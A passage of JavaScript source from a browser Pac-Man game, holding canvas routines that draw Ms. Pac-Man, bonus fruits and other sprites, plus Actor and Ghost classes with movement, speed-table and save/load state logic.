        ctx.restore();
    },
    drawMsPacmanSprite = function (ctx, x, y, dirEnum, frame, rot_angle) {
      var angle = 0;
      0 == frame
        ? drawPacmanSprite(
            ctx,
            x,
            y,
            dirEnum,
            0,
            void 0,
            void 0,
            void 0,
            void 0,
            void 0,
            rot_angle
          )
        : 1 == frame
        ? ((angle = Math.atan(0.8)),
          drawPacmanSprite(
            ctx,
            x,
            y,
            dirEnum,
            angle,
            void 0,
            void 0,
            void 0,
            void 0,
            void 0,
            rot_angle
          ),
          (angle = Math.atan(0.5)))
        : 2 == frame &&
          ((angle = Math.atan(2)),
          drawPacmanSprite(
            ctx,
            x,
            y,
            dirEnum,
            angle,
            void 0,
            void 0,
            void 0,
            void 0,
            void 0,
            rot_angle
          ),
          (angle = Math.atan(1))),
        ctx.save(),
        ctx.translate(x, y),
        rot_angle && ctx.rotate(rot_angle);
      var d90 = Math.PI / 2;
      0 == dirEnum
        ? ctx.rotate(-d90)
        : 2 == dirEnum
        ? ctx.rotate(d90)
        : 1 == dirEnum && ctx.scale(-1, 1);
      (x = -7.5), (y = -7.5);
      if (
        ((ctx.fillStyle = "#F00"),
        ctx.beginPath(),
        ctx.arc(x + 1, y + 4, 1.25, 0, 2 * Math.PI),
        ctx.closePath(),
        ctx.fill(),
        ctx.beginPath(),
        ctx.arc(x + 2, y + 5, 1.25, 0, 2 * Math.PI),
        ctx.closePath(),
        ctx.fill(),
        ctx.beginPath(),
        ctx.arc(x + 3, y + 3, 1.25, 0, 2 * Math.PI),
        ctx.closePath(),
        ctx.fill(),
        ctx.beginPath(),
        ctx.arc(x + 4, y + 1, 1.25, 0, 2 * Math.PI),
        ctx.closePath(),
        ctx.fill(),
        ctx.beginPath(),
        ctx.arc(x + 5, y + 2, 1.25, 0, 2 * Math.PI),
        ctx.closePath(),
        ctx.fill(),
        (ctx.fillStyle = "#0031FF"),
        ctx.beginPath(),
        ctx.arc(x + 2.5, y + 3.5, 0.5, 0, 2 * Math.PI),
        ctx.closePath(),
        ctx.fill(),
        ctx.beginPath(),
        ctx.arc(x + 3.5, y + 2.5, 0.5, 0, 2 * Math.PI),
        ctx.closePath(),
        ctx.fill(),
        (ctx.strokeStyle = "#F00"),
        (ctx.lineWidth = 1.25),
        (ctx.lineCap = "round"),
        ctx.beginPath(),
        0 == frame)
      )
        ctx.moveTo(5, 0),
          ctx.lineTo(6.5, 0),
          ctx.moveTo(6.5, -1.5),
          ctx.lineTo(6.5, 1.5);
      else {
        var r1 = 7.5,
          r2 = 8.5,
          c = Math.cos(angle),
          s = Math.sin(angle);
        ctx.moveTo(r1 * c - 3, r1 * s),
          ctx.lineTo(r2 * c - 3, r2 * s),
          ctx.moveTo(r1 * c - 3, -r1 * s),
          ctx.lineTo(r2 * c - 3, -r2 * s);
      }
      if (
        (ctx.stroke(),
        ctx.beginPath(),
        ctx.arc(-3, 2, 0.5, 0, 2 * Math.PI),
        (ctx.fillStyle = "#000"),
        ctx.fill(),
        (ctx.strokeStyle = "#000"),
        (ctx.lineCap = "round"),
        ctx.beginPath(),
        0 == frame)
      )
        ctx.moveTo(-2.5, -2), ctx.lineTo(-0.5, -2);
      else {
        (r1 = 0.5), (r2 = 2.5), (c = Math.cos(angle)), (s = Math.sin(angle));
        ctx.moveTo(r1 * c - 3, -2 - r1 * s),
          ctx.lineTo(r2 * c - 3, -2 - r2 * s);
      }
      ctx.stroke(), ctx.restore();
    },
    drawCookiemanSprite =
      ((prevFrame = void 0),
      (sx1 = 0),
      (sy1 = 0),
      (sx2 = 0),
      (sy2 = 0),
      function (ctx, x, y, dirEnum, frame, shake, rot_angle) {
        var angle = 0,
          draw = function (angle) {
            drawPacmanSprite(
              ctx,
              x,
              y,
              dirEnum,
              angle,
              void 0,
              void 0,
              void 0,
              void 0,
              "#47b8ff",
              rot_angle
            );
          };
        0 == frame
          ? draw(0)
          : 1 == frame
          ? (draw((angle = Math.atan(0.8))), (angle = Math.atan(0.5)))
          : 2 == frame &&
            (draw((angle = Math.atan(2))), (angle = Math.atan(1))),
          ctx.save(),
          ctx.translate(x, y),
          rot_angle && ctx.rotate(rot_angle);
        var d90 = Math.PI / 2;
        0 == dirEnum
          ? ctx.rotate(-d90)
          : 2 == dirEnum
          ? ctx.rotate(d90)
          : 1 == dirEnum && ctx.scale(-1, 1),
          (x = -4),
          (y = -3.5),
          (angle /= 3),
          (angle += Math.PI / 8);
        var c = Math.cos(angle),
          s = Math.sin(angle);
        shake &&
          (frame != prevFrame &&
            (function () {
              var a1 = Math.random() * Math.PI * 2,
                a2 = Math.random() * Math.PI * 2,
                r1 = 1 * Math.random(),
                r2 = 1 * Math.random();
              (sx1 = Math.cos(a1) * r1),
                (sy1 = Math.sin(a1) * r1),
                (sx2 = Math.cos(a2) * r2),
                (sy2 = Math.sin(a2) * r2);
            })(),
          (prevFrame = frame)),
          ctx.beginPath(),
          ctx.arc(x + 6 * c, y - 6 * s, 2.1, 0, 2 * Math.PI),
          (ctx.fillStyle = "#FFF"),
          ctx.fill(),
          ctx.beginPath(),
          ctx.arc(x + 6 * c + sx2, y - 6 * s + sy2, 1, 0, 2 * Math.PI),
          (ctx.fillStyle = "#000"),
          ctx.fill(),
          ctx.beginPath(),
          ctx.arc(x + 3 * c, y - 3 * s, 2.1, 0, 2 * Math.PI),
          (ctx.fillStyle = "#FFF"),
          ctx.fill(),
          ctx.beginPath(),
          ctx.arc(x + 3 * c + sx1, y - 3 * s + sy1, 1, 0, 2 * Math.PI),
          (ctx.fillStyle = "#000"),
          ctx.fill(),
          ctx.restore();
      }),
    drawCherry = function (ctx, x, y) {
      var cherry = function (x, y) {
        ctx.save(),
          ctx.translate(x, y),
          ctx.beginPath(),
          ctx.arc(2.5, 2.5, 3, 0, 2 * Math.PI),
          (ctx.lineWidth = 1),
          (ctx.strokeStyle = "#000"),
          ctx.stroke(),
          (ctx.fillStyle = "#ff0000"),
          ctx.fill(),
          (ctx.lineCap = "round"),
          ctx.beginPath(),
          ctx.moveTo(1, 3),
          ctx.lineTo(2, 4),
          (ctx.strokeStyle = "#fff"),
          ctx.stroke(),
          ctx.restore();
      };
      ctx.save(),
        ctx.translate(x, y),
        cherry(-6, -1),
        cherry(-1, 1),
        ctx.beginPath(),
        ctx.moveTo(-3, 0),
        ctx.bezierCurveTo(-1, -2, 2, -4, 5, -5),
        ctx.lineTo(5, -4),
        ctx.bezierCurveTo(3, -4, 1, 0, 1, 2),
        (ctx.strokeStyle = "#ff9900"),
        (ctx.lineJoin = "round"),
        (ctx.lineCap = "round"),
        ctx.stroke(),
        ctx.restore();
    },
    drawStrawberry = function (ctx, x, y) {
      ctx.save(),
        ctx.translate(x, y),
        ctx.beginPath(),
        ctx.moveTo(-1, -4),
        ctx.bezierCurveTo(-3, -4, -5, -3, -5, -1),
        ctx.bezierCurveTo(-5, 3, -2, 5, 0, 6),
        ctx.bezierCurveTo(3, 5, 5, 2, 5, 0),
        ctx.bezierCurveTo(5, -3, 3, -4, 0, -4),
        (ctx.fillStyle = "#f00"),
        ctx.fill(),
        (ctx.strokeStyle = "#f00"),
        ctx.stroke();
      var i,
        len,
        spots = [
          {
            x: -4,
            y: -1,
          },
          {
            x: -3,
            y: 2,
          },
          {
            x: -2,
            y: 0,
          },
          {
            x: -1,
            y: 4,
          },
          {
            x: 0,
            y: 2,
          },
          {
            x: 0,
            y: 0,
          },
          {
            x: 2,
            y: 4,
          },
          {
            x: 2,
            y: -1,
          },
          {
            x: 3,
            y: 1,
          },
          {
            x: 4,
            y: -2,
          },
        ];
      for (ctx.fillStyle = "#fff", i = 0, len = spots.length; i < len; i++) {
        var s = spots[i];
        ctx.beginPath(), ctx.arc(s.x, s.y, 0.75, 0, 2 * Math.PI), ctx.fill();
      }
      ctx.beginPath(),
        ctx.moveTo(0, -4),
        ctx.lineTo(-3, -4),
        ctx.lineTo(0, -4),
        ctx.lineTo(-2, -3),
        ctx.lineTo(-1, -3),
        ctx.lineTo(0, -4),
        ctx.lineTo(0, -2),
        ctx.lineTo(0, -4),
        ctx.lineTo(1, -3),
        ctx.lineTo(2, -3),
        ctx.lineTo(0, -4),
        ctx.lineTo(3, -4),
        ctx.closePath(),
        (ctx.strokeStyle = "#00ff00"),
        (ctx.lineCap = "round"),
        (ctx.lineJoin = "round"),
        ctx.stroke(),
        ctx.beginPath(),
        ctx.moveTo(0, -4),
        ctx.lineTo(0, -5),
        (ctx.lineCap = "round"),
        (ctx.strokeStyle = "#fff"),
        ctx.stroke(),
        ctx.restore();
    },
    drawOrange = function (ctx, x, y) {
      ctx.save(),
        ctx.translate(x, y),
        ctx.beginPath(),
        ctx.moveTo(-2, -2),
        ctx.bezierCurveTo(-3, -2, -5, -1, -5, 1),
        ctx.bezierCurveTo(-5, 4, -3, 6, 0, 6),
        ctx.bezierCurveTo(3, 6, 5, 4, 5, 1),
        ctx.bezierCurveTo(5, -1, 3, -2, 2, -2),
        ctx.closePath(),
        (ctx.fillStyle = "#ffcc33"),
        ctx.fill(),
        (ctx.strokeStyle = "#ffcc33"),
        ctx.stroke(),
        ctx.beginPath(),
        ctx.moveTo(-1, -1),
        ctx.quadraticCurveTo(-1, -2, -2, -2),
        ctx.quadraticCurveTo(-1, -2, -1, -4),
        ctx.quadraticCurveTo(-1, -2, 0, -2),
        ctx.quadraticCurveTo(-1, -2, -1, -1),
        (ctx.strokeStyle = "#ff9900"),
        (ctx.lineJoin = "round"),
        ctx.stroke(),
        ctx.beginPath(),
        ctx.moveTo(-0.5, -4),
        ctx.quadraticCurveTo(0, -5, 1, -5),
        ctx.bezierCurveTo(2, -5, 3, -4, 4, -4),
        ctx.bezierCurveTo(3, -4, 3, -3, 2, -3),
        ctx.bezierCurveTo(1, -3, 1, -4, -0.5, -4),
        (ctx.strokeStyle = "#00ff00"),
        (ctx.lineCap = "round"),
        (ctx.lineJoin = "round"),
        ctx.stroke(),
        (ctx.fillStyle = "#00ff00"),
        ctx.fill(),
        ctx.restore();
    },
    drawApple = function (ctx, x, y) {
      ctx.save(),
        ctx.translate(x, y),
        ctx.beginPath(),
        ctx.moveTo(-2, -3),
        ctx.bezierCurveTo(-2, -4, -3, -4, -4, -4),
        ctx.bezierCurveTo(-5, -4, -6, -3, -6, 0),
        ctx.bezierCurveTo(-6, 3, -4, 6, -2.5, 6),
        ctx.quadraticCurveTo(-1, 6, -1, 5),
        ctx.bezierCurveTo(-1, 6, 0, 6, 1, 6),
        ctx.bezierCurveTo(3, 6, 5, 3, 5, 0),
        ctx.bezierCurveTo(5, -3, 3, -4, 2, -4),
        ctx.quadraticCurveTo(0, -4, 0, -3),
        ctx.closePath(),
        (ctx.fillStyle = "#ff0000"),
        ctx.fill(),
        ctx.beginPath(),
        ctx.moveTo(-1, -3),
        ctx.quadraticCurveTo(-1, -5, 0, -5),
        (ctx.lineCap = "round"),
        (ctx.strokeStyle = "#ff9900"),
        ctx.stroke(),
        ctx.beginPath(),
        ctx.moveTo(2, 3),
        ctx.quadraticCurveTo(3, 3, 3, 1),
        (ctx.lineCap = "round"),
        (ctx.strokeStyle = "#fff"),
        ctx.stroke(),
        ctx.restore();
    },
    drawMelon = function (ctx, x, y) {
      ctx.save(),
        ctx.translate(x, y),
        ctx.beginPath(),
        ctx.arc(0, 2, 5.5, 0, 2 * Math.PI),
        (ctx.fillStyle = "#7bf331"),
        ctx.fill(),
        ctx.beginPath(),
        ctx.moveTo(0, -4),
        ctx.lineTo(0, -5),
        ctx.moveTo(2, -5),
        ctx.quadraticCurveTo(-3, -5, -3, -6),
        (ctx.strokeStyle = "#69b4af"),
        (ctx.lineCap = "round"),
        ctx.stroke();
      var spots = [
        0, -2, -1, -1, -2, 0, -3, 1, -4, 2, -3, 3, -2, 4, -1, 5, -2, 6, -3, -1,
        1, 7, 2, 6, 3, 5, 2, 4, 1, 3, 0, 2, 1, 1, 2, 0, 3, -1, 3, 1, 4, 2,
      ];
      for (
        ctx.fillStyle = "#69b4af", i = 0, len = spots.length;
        i < len;
        i += 2
      ) {
        (x = spots[i]), (y = spots[i + 1]);
        ctx.beginPath(), ctx.arc(x, y, 0.65, 0, 2 * Math.PI), ctx.fill();
      }
      var i, len;
      spots = [
        {
          x: 0,
          y: -3,
        },
        {
          x: -2,
          y: -1,
        },
        {
          x: -4,
          y: 1,
        },
        {
          x: -3,
          y: 3,
        },
        {
          x: 1,
          y: 0,
        },
        {
          x: -1,
          y: 2,
        },
        {
          x: -1,
          y: 4,
        },
        {
          x: 3,
          y: 2,
        },
        {
          x: 1,
          y: 4,
        },
      ];
      for (ctx.fillStyle = "#fff", i = 0, len = spots.length; i < len; i++) {
        var s = spots[i];
        ctx.beginPath(), ctx.arc(s.x, s.y, 0.65, 0, 2 * Math.PI), ctx.fill();
      }
      ctx.restore();
    },
    drawGalaxian = function (ctx, x, y) {
      ctx.save(),
        ctx.translate(x, y),
        ctx.beginPath(),
        ctx.moveTo(-4, -2),
        ctx.lineTo(4, -2),
        ctx.lineTo(4, -1),
        ctx.lineTo(2, 1),
        ctx.lineTo(1, 0),
        ctx.lineTo(0, 0),
        ctx.lineTo(0, 5),
        ctx.lineTo(0, 0),
        ctx.lineTo(-1, 0),
        ctx.lineTo(-2, 1),
        ctx.lineTo(-4, -1),
        ctx.closePath(),
        (ctx.lineJoin = "round"),
        (ctx.strokeStyle = ctx.fillStyle = "#fffa36"),
        ctx.fill(),
        ctx.stroke(),
        ctx.beginPath(),
        ctx.moveTo(0, -5),
        ctx.lineTo(-3, -2),
        ctx.lineTo(-2, -2),
        ctx.lineTo(-1, -3),
        ctx.lineTo(0, -3),
        ctx.lineTo(0, -1),
        ctx.lineTo(0, -3),
        ctx.lineTo(1, -3),
        ctx.lineTo(2, -2),
        ctx.lineTo(3, -2),
        ctx.closePath(),
        (ctx.lineJoin = "round"),
        (ctx.strokeStyle = ctx.fillStyle = "#f00"),
        ctx.fill(),
        ctx.stroke(),
        ctx.beginPath(),
        ctx.moveTo(-5, -4),
        ctx.lineTo(-5, -1),
        ctx.lineTo(-2, 2),
        ctx.moveTo(5, -4),
        ctx.lineTo(5, -1),
        ctx.lineTo(2, 2),
        (ctx.strokeStyle = "#00f"),
        (ctx.lineJoin = "round"),
        ctx.stroke(),
        ctx.restore();
    },
    drawBell = function (ctx, x, y) {
      ctx.save(),
        ctx.translate(x, y),
        ctx.beginPath(),
        ctx.moveTo(-1, -5),
        ctx.bezierCurveTo(-4, -5, -6, 1, -6, 6),
        ctx.lineTo(5, 6),
        ctx.bezierCurveTo(5, 1, 3, -5, 0, -5),
        ctx.closePath(),
        (ctx.fillStyle = ctx.strokeStyle = "#fffa37"),
        ctx.stroke(),
        ctx.fill(),
        ctx.beginPath(),
        ctx.moveTo(-4, 4),
        ctx.lineTo(-4, 3),
        ctx.moveTo(-3, 1),
        ctx.quadraticCurveTo(-3, -2, -2, -2),
        ctx.moveTo(-1, -4),
        ctx.lineTo(0, -4),
        (ctx.lineCap = "round"),
        (ctx.strokeStyle = "#000"),
        ctx.stroke(),
        ctx.beginPath(),
        ctx.rect(-5.5, 6, 10, 2),
        (ctx.fillStyle = "#68b9fc"),
        ctx.fill(),
        ctx.beginPath(),
        ctx.rect(-0.5, 6, 2, 2),
        (ctx.fillStyle = "#fff"),
        ctx.fill(),
        ctx.restore();
    },
    drawKey = function (ctx, x, y) {
      ctx.save(),
        ctx.translate(x, y),
        ctx.beginPath(),
        ctx.moveTo(-1, -2),
        ctx.lineTo(-1, 5),
        ctx.moveTo(0, 6),
        ctx.quadraticCurveTo(1, 6, 1, 3),
        ctx.moveTo(1, 4),
        ctx.lineTo(2, 4),
        ctx.moveTo(1, 1),
        ctx.lineTo(1, -2),
        ctx.moveTo(1, 0),
        ctx.lineTo(2, 0),
        (ctx.lineCap = "round"),
        (ctx.strokeStyle = "#fff"),
        ctx.stroke(),
        ctx.beginPath(),
        ctx.moveTo(0, -6),
        ctx.quadraticCurveTo(-3, -6, -3, -4),
        ctx.lineTo(-3, -2),
        ctx.lineTo(3, -2),
        ctx.lineTo(3, -4),
        ctx.quadraticCurveTo(3, -6, 0, -6),
        (ctx.strokeStyle = ctx.fillStyle = "#68b9fc"),
        ctx.fill(),
        (ctx.lineJoin = "round"),
        ctx.stroke(),
        ctx.beginPath(),
        ctx.moveTo(1, -5),
        ctx.lineTo(-1, -5),
        (ctx.lineCap = "round"),
        (ctx.strokeStyle = "#000"),
        ctx.stroke(),
        ctx.restore();
    },
    drawPretzel = function (ctx, x, y) {
      ctx.save(),
        ctx.translate(x, y),
        ctx.beginPath(),
        ctx.moveTo(-2, -5),
        ctx.quadraticCurveTo(-4, -6, -6, -4),
        ctx.quadraticCurveTo(-7, -2, -5, 1),
        ctx.quadraticCurveTo(-3, 4, 0, 5),
        ctx.quadraticCurveTo(5, 5, 5, -1),
        ctx.quadraticCurveTo(6, -5, 3, -5),
        ctx.quadraticCurveTo(1, -5, 0, -2),
        ctx.quadraticCurveTo(-2, 3, -5, 5),
        ctx.moveTo(1, 1),
        ctx.quadraticCurveTo(3, 4, 4, 6),
        (ctx.lineWidth = 2),
        (ctx.lineCap = "round"),
        (ctx.strokeStyle = "#ffcc33"),
        ctx.stroke();
      var i,
        len,
        spots = [-5, -6, 1, -6, 4, -4, -5, 0, -2, 0, 6, 1, -4, 6, 5, 5];
      for (ctx.fillStyle = "#fff", i = 0, len = spots.length; i < len; i += 2) {
        (x = spots[i]), (y = spots[i + 1]);
        ctx.beginPath(), ctx.arc(x, y, 0.65, 0, 2 * Math.PI), ctx.fill();
      }
      ctx.restore();
    },
    drawPear = function (ctx, x, y) {
      ctx.save(),
        ctx.translate(x, y),
        ctx.beginPath(),
        ctx.moveTo(0, -4),
        ctx.bezierCurveTo(-1, -4, -2, -3, -2, -1),
        ctx.bezierCurveTo(-2, 1, -4, 2, -4, 4),
        ctx.bezierCurveTo(-4, 6, -2, 7, 0, 7),
        ctx.bezierCurveTo(2, 7, 4, 6, 4, 4),
        ctx.bezierCurveTo(4, 2, 2, 1, 2, -1),
        ctx.bezierCurveTo(2, -3, 1, -4, 0, -4),
        (ctx.fillStyle = ctx.strokeStyle = "#00ff00"),
        ctx.stroke(),
        ctx.fill(),
        ctx.beginPath(),
        ctx.moveTo(-2, 3),
        ctx.quadraticCurveTo(-2, 5, -1, 5),
        (ctx.strokeStyle = "#0033ff"),
        (ctx.lineCap = "round"),
        ctx.stroke(),
        ctx.beginPath(),
        ctx.moveTo(0, -4),
        ctx.quadraticCurveTo(0, -6, 2, -6),
        (ctx.strokeStyle = "#fff"),
        (ctx.lineCap = "round"),
        ctx.stroke(),
        ctx.restore();
    },
    drawBanana = function (ctx, x, y) {
      ctx.save(),
        ctx.translate(x, y),
        ctx.beginPath(),
        ctx.moveTo(-5, 5),
        ctx.quadraticCurveTo(-4, 5, -2, 6),
        ctx.bezierCurveTo(2, 6, 6, 2, 6, -4),
        ctx.lineTo(3, -3),
        ctx.lineTo(3, -2),
        ctx.lineTo(-4, 5),
        ctx.closePath(),
        (ctx.fillStyle = ctx.strokeStyle = "#ffff00"),
        ctx.stroke(),
        ctx.fill(),
        ctx.beginPath(),
        ctx.moveTo(4, -5),
        ctx.lineTo(5, -6),
        (ctx.strokeStyle = "#ffff00"),
        (ctx.lineCap = "round"),
        ctx.stroke(),
        ctx.beginPath(),
        ctx.moveTo(3, -1),
        ctx.lineTo(-2, 4),
        (ctx.strokeStyle = "#000"),
        (ctx.lineCap = "round"),
        ctx.stroke(),
        ctx.beginPath(),
        ctx.moveTo(2, 3),
        ctx.lineTo(0, 5),
        (ctx.strokeStyle = "#fff"),
        (ctx.lineCap = "round"),
        ctx.stroke(),
        ctx.restore();
    },
    drawCookie = function (ctx, x, y) {
      ctx.save(),
        ctx.translate(x, y),
        ctx.beginPath(),
        ctx.arc(0, 0, 6, 0, 2 * Math.PI),
        (ctx.fillStyle = "#f9bd6d"),
        ctx.fill();
      var i,
        len,
        spots = [0, -3, -4, -1, 0, 2, 3, 0, 3, 3];
      for (ctx.fillStyle = "#000", i = 0, len = spots.length; i < len; i += 2) {
        (x = spots[i]), (y = spots[i + 1]);
        ctx.beginPath(), ctx.arc(x, y, 0.75, 0, 2 * Math.PI), ctx.fill();
      }
      ctx.restore();
    },
    drawCookieFlash = function (ctx, x, y) {
      ctx.save(),
        ctx.translate(x, y),
        ctx.beginPath(),
        ctx.arc(0, 0, 6, 0, 2 * Math.PI),
        (ctx.fillStyle = "#000"),
        (ctx.lineWidth = 1),
        (ctx.strokeStyle = "#f9bd6d"),
        ctx.fill(),
        ctx.stroke();
      var i,
        len,
        spots = [0, -3, -4, -1, 0, 2, 3, 0, 3, 3];
      for (
        ctx.fillStyle = "#f9bd6d", i = 0, len = spots.length;
        i < len;
        i += 2
      ) {
        (x = spots[i]), (y = spots[i + 1]);
        ctx.beginPath(), ctx.arc(x, y, 0.75, 0, 2 * Math.PI), ctx.fill();
      }
      ctx.restore();
    },
    getSpriteFuncFromFruitName = function (name) {
      return {
        cherry: drawCherry,
        strawberry: drawStrawberry,
        orange: drawOrange,
        apple: drawApple,
        melon: drawMelon,
        galaxian: drawGalaxian,
        bell: drawBell,
        key: drawKey,
        pretzel: drawPretzel,
        pear: drawPear,
        banana: drawBanana,
        cookie: drawCookie,
      }[name];
    },
    drawRewindSymbol = function (ctx, x, y, color) {
      ctx.save(), (ctx.fillStyle = color), ctx.translate(x, y);
      var drawTriangle = function (x) {
        ctx.beginPath(),
          ctx.moveTo(x, 3),
          ctx.lineTo(x - 6, 0),
          ctx.lineTo(x, -3),
          ctx.closePath(),
          ctx.fill();
      };
      drawTriangle(0), drawTriangle(6), ctx.restore();
    },
    drawSnail = function (ctx, x, y, color) {
      ctx.save(),
        ctx.translate(x, y),
        ctx.beginPath(),
        ctx.moveTo(-7, 3),
        ctx.lineTo(-5, 3),
        ctx.bezierCurveTo(-6, 0, -5, -3, -2, -3),
        ctx.bezierCurveTo(0, -3, 2, -2, 2, 2),
        ctx.bezierCurveTo(3, -1, 3, -2, 5, -2),
        ctx.bezierCurveTo(6, -2, 6, 0, 5, 0),
        ctx.bezierCurveTo(4, 1, 4, 3, 2, 3),
        ctx.closePath(),
        (ctx.lineWidth = 1),
        (ctx.lineCap = ctx.lineJoin = "round"),
        (ctx.fillStyle = ctx.strokeStyle = color),
        ctx.fill(),
        ctx.stroke(),
        ctx.beginPath(),
        ctx.moveTo(4, -2),
        ctx.lineTo(3, -5),
        ctx.moveTo(5, -1),
        ctx.lineTo(7, -5),
        ctx.stroke(),
        ctx.beginPath(),
        ctx.arc(3, -5, 1, 0, 2 * Math.PI),
        ctx.fill(),
        ctx.beginPath(),
        ctx.arc(7, -5, 1, 0, 2 * Math.PI),
        ctx.fill(),
        ctx.beginPath(),
        ctx.moveTo(-4, 1),
        ctx.bezierCurveTo(-5, -1, -3, -3, -1, -2),
        ctx.bezierCurveTo(0, -1, 0, 0, -1, 1),
        ctx.bezierCurveTo(-2, 1, -3, 0, -2, -0.5),
        (ctx.lineWidth = 0.5),
        (ctx.strokeStyle = "#000"),
        ctx.stroke(),
        ctx.restore();
    },
    drawHeartSprite = function (ctx, x, y) {
      ctx.save(),
        ctx.translate(x, y),
        (ctx.fillStyle = "#ffb8ff"),
        ctx.beginPath(),
        ctx.moveTo(0, -3),
        ctx.bezierCurveTo(-1, -4, -2, -6, -3.5, -6),
        ctx.quadraticCurveTo(-7, -6, -7, -0.5),
        ctx.bezierCurveTo(-7, 2, -2, 5, 0, 7),
        ctx.bezierCurveTo(2, 5, 7, 2, 7, -0.5),
        ctx.quadraticCurveTo(7, -6, 3.5, -6),
        ctx.bezierCurveTo(2, -6, 1, -4, 0, -3),
        ctx.closePath(),
        ctx.fill(),
        ctx.restore();
    },
    drawExclamationPoint = function (ctx, x, y) {
      ctx.save(),
        ctx.translate(x, y),
        (ctx.lineWidth = 0.5),
        (ctx.strokeStyle = ctx.fillStyle = "#ff0"),
        ctx.beginPath(),
        ctx.moveTo(-1, 1),
        ctx.bezierCurveTo(-1, 0, -1, -3, 0, -3),
        ctx.lineTo(2, -3),
        ctx.bezierCurveTo(2, -2, 0, 0, -1, 1),
        ctx.fill(),
        ctx.stroke(),
        ctx.beginPath(),
        ctx.arc(-2, 3, 0.5, 0, 2 * Math.PI),
        ctx.fill(),
        ctx.stroke(),
        ctx.restore();
    },
    Actor = function () {
      (this.dir = {}),
        (this.pixel = {}),
        (this.tile = {}),
        (this.tilePixel = {}),
        (this.distToMid = {}),
        (this.targetTile = {}),
        (this.frames = 0),
        (this.steps = 0),
        (this.isDrawTarget = !1),
        (this.isDrawPath = !1),
        (this.savedSteps = {}),
        (this.savedFrames = {}),
        (this.savedDirEnum = {}),
        (this.savedPixel = {}),
        (this.savedTargetting = {}),
        (this.savedTargetTile = {});
    };
  (Actor.prototype.save = function (t) {
    (this.savedSteps[t] = this.steps),
      (this.savedFrames[t] = this.frames),
      (this.savedDirEnum[t] = this.dirEnum),
      (this.savedPixel[t] = {
        x: this.pixel.x,
        y: this.pixel.y,
      }),
      (this.savedTargetting[t] = this.targetting),
      (this.savedTargetTile[t] = {
        x: this.targetTile.x,
        y: this.targetTile.y,
      });
  }),
    (Actor.prototype.load = function (t) {
      (this.steps = this.savedSteps[t]),
        (this.frames = this.savedFrames[t]),
        this.setDir(this.savedDirEnum[t]),
        this.setPos(this.savedPixel[t].x, this.savedPixel[t].y),
        (this.targetting = this.savedTargetting[t]),
        (this.targetTile.x = this.savedTargetTile[t].x),
        (this.targetTile.y = this.savedTargetTile[t].y);
    }),
    (Actor.prototype.reset = function () {
      this.setDir(this.startDirEnum),
        this.setPos(this.startPixel.x, this.startPixel.y),
        (this.frames = 0),
        (this.steps = 0),
        (this.targetting = !1);
    }),
    (Actor.prototype.setPos = function (px, py) {
      (this.pixel.x = px), (this.pixel.y = py), this.commitPos();
    }),
    (Actor.prototype.getTilePixel = function (pixel, tilePixel) {
      return (
        null == pixel && (pixel = this.pixel),
        null == tilePixel && (tilePixel = {}),
        (tilePixel.x = pixel.x % 8),
        (tilePixel.y = pixel.y % 8),
        tilePixel.x < 0 && (tilePixel.x += 8),
        tilePixel.y < 0 && (tilePixel.y += 8),
        tilePixel
      );
    }),
    (Actor.prototype.commitPos = function () {
      map && map.teleport(this),
        (this.tile.x = Math.floor(this.pixel.x / 8)),
        (this.tile.y = Math.floor(this.pixel.y / 8)),
        this.getTilePixel(this.pixel, this.tilePixel),
        (this.distToMid.x = midTile_x - this.tilePixel.x),
        (this.distToMid.y = midTile_y - this.tilePixel.y);
    }),
    (Actor.prototype.setDir = function (dirEnum) {
      setDirFromEnum(this.dir, dirEnum), (this.dirEnum = dirEnum);
    });
  (Actor.prototype.getStepSizeFromTable = function (level, pattern) {
    var entry;
    if (!(level < 1))
      return (
        1 == level
          ? (entry = 0)
          : level >= 2 && level <= 4
          ? (entry = 1)
          : level >= 5 && level <= 20
          ? (entry = 2)
          : level >= 21 && (entry = 3),
        "1111111111111111011111111111111111112111111121110110110101101101010101010101010111111111111111111111111121111111111121111111211111111111211111111111211112111121011011011011011101101010110101011111211111112111111121111211112111211121112111211111211112111121112111211121112101110111011101110110110101101101112111211121112111211211211211211111211111112111111121111211112100000000000000000000000000000000011011010110110111211121112111211121121121121121"[
          7 * entry * 16 + 16 * pattern + (this.frames % 16)
        ]
      );
  }),
    (Actor.prototype.update = function (j) {
      j >= this.getNumSteps() || ((this.steps += this.step()), this.steer());
    });
  var bounceY,
    steerFuncs,
    GHOST_EATEN = 1,
    GHOST_GOING_HOME = 2,
    GHOST_ENTERING_HOME = 3,
    Ghost = function () {
      Actor.apply(this),
        (this.randomScatter = !1),
        (this.faceDirEnum = this.dirEnum);
    };
  ((Ghost.prototype = newChildObject(Actor.prototype)).getBounceY =
    ((bounceY = {
      0: [-4, -2, 0, 2, 4, 3, 2, 3],
      2: [3, 5, 7, 5, 4, 5, 7, 8],
      1: [2, 3, 3, 4, 3, 2, 2, 2],
      3: [2, 2, 3, 4, 3, 3, 2, 2],
    }),
    function (px, py, dirEnum) {
      if (
        (null == px && (px = this.pixel.x),
        null == py && (py = this.pixel.y),
        null == dirEnum && (dirEnum = this.dirEnum),
        0 != this.mode || !this.scared || 2 != gameMode)
      )
        return py;
      var tilePixel = this.getTilePixel({
          x: px,
          y: py,
        }),
        y = 8 * Math.floor(py / 8);
      return (y +=
        0 == dirEnum || 2 == dirEnum
          ? bounceY[dirEnum][tilePixel.y]
          : bounceY[dirEnum][tilePixel.x]);
    })),
    (Ghost.prototype.getAnimFrame = function (frames) {
      return (
        null == frames && (frames = this.frames), Math.floor(frames / 8) % 2
      );
    }),
    (Ghost.prototype.reset = function () {
      (this.sigReverse = !1),
        (this.sigLeaveHome = !1),
        (this.mode = this.startMode),
        (this.scared = !1),
        audio.ghostReset(),
        (this.savedSigReverse = {}),
        (this.savedSigLeaveHome = {}),
        (this.savedMode = {}),
        (this.savedScared = {}),
        (this.savedElroy = {}),
        (this.savedFaceDirEnum = {}),
        Actor.prototype.reset.apply(this),
        (this.faceDirEnum = this.dirEnum);
    }),
    (Ghost.prototype.save = function (t) {
      (this.savedSigReverse[t] = this.sigReverse),
        (this.savedSigLeaveHome[t] = this.sigLeaveHome),
        (this.savedMode[t] = this.mode),
        (this.savedScared[t] = this.scared),
        this == blinky && (this.savedElroy[t] = this.elroy),
        (this.savedFaceDirEnum[t] = this.faceDirEnum),
        Actor.prototype.save.call(this, t);
    }),
    (Ghost.prototype.load = function (t) {
      (this.sigReverse = this.savedSigReverse[t]),
        (this.sigLeaveHome = this.savedSigLeaveHome[t]),
        (this.mode = this.savedMode[t]),
        (this.scared = this.savedScared[t]),
        this == blinky && (this.elroy = this.savedElroy[t]),
